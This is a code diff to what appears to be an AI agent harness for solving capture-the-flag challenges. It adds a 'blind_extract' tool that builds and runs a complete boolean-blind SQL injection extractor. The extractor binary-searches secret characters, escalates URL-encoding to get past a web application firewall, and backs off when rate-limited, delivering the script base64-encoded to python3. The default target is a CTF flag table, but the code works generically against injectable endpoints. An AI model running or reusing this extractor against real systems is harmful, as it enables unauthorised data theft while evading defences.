@@ -174,9 +174,108 @@ def _rate_nudge(out: str, state: dict) -> str:
     return ""
 
 
+def _blind_extract_script(params: dict) -> str:
+    """The exploit PRIMITIVE, as a self-contained stdlib script run inside the sandbox.
+    Boolean-blind extraction: binary-search each char via `ascii(substr(sub,pos,1))>N`,
+    paced (sleep between requests) with exponential backoff on HTTP 429, auto-escalating
+    URL-encode depth until a known-true calibration probe clears the WAF. Collapses ~200
+    oracle requests into ONE tool call — the fix for the turn-cap/rate-trip failure mode
+    (see docs: agent hand-looped extraction interactively and blew the turn budget)."""
+    import json
+    return "import json,sys,time,urllib.request,urllib.error\n" + \
+           "from urllib.parse import quote\n" + \
+           f"P=json.loads(r'''{json.dumps(params)}''')\n" + r'''
+OR,TM = P["oracle_url"], P["true_marker"]
+SUB = P.get("subquery","(select flag from secrets)")
+MAXLEN,DELAY = int(P.get("max_len",64)), float(P.get("delay",0.4))
+DEPTH0,MAXDEPTH = int(P.get("encode_depth",1)), int(P.get("max_encode_depth",3))
+CHARF="ascii(substr(%s,%d,1))%s%d"
+LENF="length(%s)%s%d"
+depth=[DEPTH0]; reqs=[0]
+
+def enc(s,n):
+    for _ in range(n): s=quote(s,safe='')
+    return s
+
+def ask(expr):
+    reqs[0]+=1
+    url=OR.replace("{cond}", enc(expr, depth[0]))
+    for a in range(8):
+        try:
+            b=urllib.request.urlopen(url,timeout=15).read().decode("utf-8","replace")
+            time.sleep(DELAY); return TM in b
+        except urllib.error.HTTPError as e:
+            if e.code==429:
+                time.sleep(2*(a+1)); continue
+            body=""
+            try: body=e.read().decode("utf-8","replace")
+            except Exception: pass
+            time.sleep(DELAY); return TM in body
+        except Exception:
+            time.sleep(1.0)
+    return False
+
+# calibrate encode depth against a MUST-BE-TRUE probe (char 1 exists in any nonempty secret)
+cal=CHARF%(SUB,1,">",0)
+while depth[0]<=MAXDEPTH and not ask(cal):
+    depth[0]+=1
+if depth[0]>MAXDEPTH:
+    print("BLIND_EXTRACT_FAIL: calibration probe never returned true after encode depth "
+          f"{DEPTH0}..{MAXDEPTH}. Injection likely blocked (wrong param/marker/injection "
+          "point, or WAF needs deeper encoding). reqs="+str(reqs[0])); sys.exit(0)
+
+def bsearch(fmt_true):   # smallest v in [lo,hi] with (>v) false => the value itself
+    lo,hi=32,126
+    while lo<hi:
+        mid=(lo+hi)//2
+        if fmt_true(mid): lo=mid+1
+        else: hi=mid
+    return lo
+
+# length (bounded); if length oracle unsupported the char loop's end-detection still stops us
+L=MAXLEN
+if ask(LENF%(SUB,">",0)):
+    lo,hi=1,MAXLEN
+    while lo<hi:
+        mid=(lo+hi)//2
+        if ask(LENF%(SUB,">",mid)): lo=mid+1
+        else: hi=mid
+    L=lo
+out=[]
+for pos in range(1,L+1):
+    if not ask(CHARF%(SUB,pos,">",31)):   # no printable char here -> end of string
+        break
+    c=bsearch(lambda v: ask(CHARF%(SUB,pos,">",v)))
+    out.append(chr(c))
+    if len(out)>MAXLEN: break
+print("BLIND_EXTRACT_OK depth=%d reqs=%d\nRECOVERED: %s"%(depth[0],reqs[0],"".join(out)))
+'''
+
+
+def _blind_extract(sb, args) -> str:
+    """Validate args, run the primitive script in the sandbox, return its output."""
+    import base64
+    if "{cond}" not in (args.get("oracle_url") or ""):
+        return ("blind_extract error: oracle_url must contain the literal token {cond} "
+                "where the boolean condition is injected, e.g. "
+                "'http://host/api/search?q=0||{cond}'.")
+    if not args.get("true_marker"):
+        return ("blind_extract error: true_marker is required — a substring present in the "
+                "response ONLY when the injected condition is true (e.g. 'Widget').")
+    script = _blind_extract_script({
+        "oracle_url": args["oracle_url"], "true_marker": args["true_marker"],
+        "subquery": args.get("subquery") or "(select flag from secrets)",
+        "max_len": args.get("max_len") or 64,
+        "encode_depth": args.get("encode_depth") or 1,
+        "delay": args.get("delay") or 0.4})
+    b64 = base64.b64encode(script.encode()).decode()
+    return sb.bash(f"echo {b64} | base64 -d | python3 -")
+
+
 def _sandbox_server(sb):
     """Build an in-process MCP server exposing this challenge's sandbox as a tool.
-    Wraps each result with the dead-end detector + decoy feedback + WAF-evasion nudge."""
+    Wraps each result with the dead-end detector + decoy feedback + WAF-evasion nudge.
+    Also exposes `blind_extract`, an executable exploit primitive for blind data reads."""
     stall = {"window": [], "cooldown": 0}
 
     @tool("sandbox_bash", "Run a shell command inside the challenge sandbox",
@@ -187,7 +286,21 @@ def _sandbox_server(sb):
                              + _decoy_nudge(out) + _waf_nudge(out, stall)
                              + _rate_nudge(out, stall)}]}
 
-    return create_sdk_mcp_server(name="ctf", version="0.1", tools=[sandbox_bash])
+    @tool("blind_extract",
+          "Extract a secret through a CONFIRMED boolean-blind oracle in ONE call: it runs "
+          "the full paced binary-search extraction in-sandbox, auto-escalates URL-encode "
+          "depth to clear a WAF, and backs off on HTTP 429. Use instead of hand-looping "
+          "requests. oracle_url must contain {cond} where the boolean condition is injected "
+          "(e.g. 'http://h/api/search?q=0||{cond}'); true_marker is a string present ONLY on "
+          "a true response; subquery is the secret expression (default '(select flag from "
+          "secrets)').",
+          {"oracle_url": str, "true_marker": str, "subquery": str,
+           "max_len": int, "encode_depth": int, "delay": float})
+    async def blind_extract(args):
+        return {"content": [{"type": "text", "text": _blind_extract(sb, args)}]}
+
+    return create_sdk_mcp_server(name="ctf", version="0.1",
+                                 tools=[sandbox_bash, blind_extract])
 
 
 def _decompiler_server(sb):
@@ -290,7 +403,7 @@ async def solve(ch: Challenge, max_turns: int = 40, retries: int = 0) -> Result:
 
         if not found:
             servers = {"ctf": _sandbox_server(sb)}
-            tools = ["mcp__ctf__sandbox_bash"]
+            tools = ["mcp__ctf__sandbox_bash", "mcp__ctf__blind_extract"]
             if os.getenv("CTF_KB", "1") != "0":   # RAG on-demand tool (ablation: CTF_KB=0)
                 servers["kb"] = _knowledge_server()
                 tools.append("mcp__kb__search_knowledge")
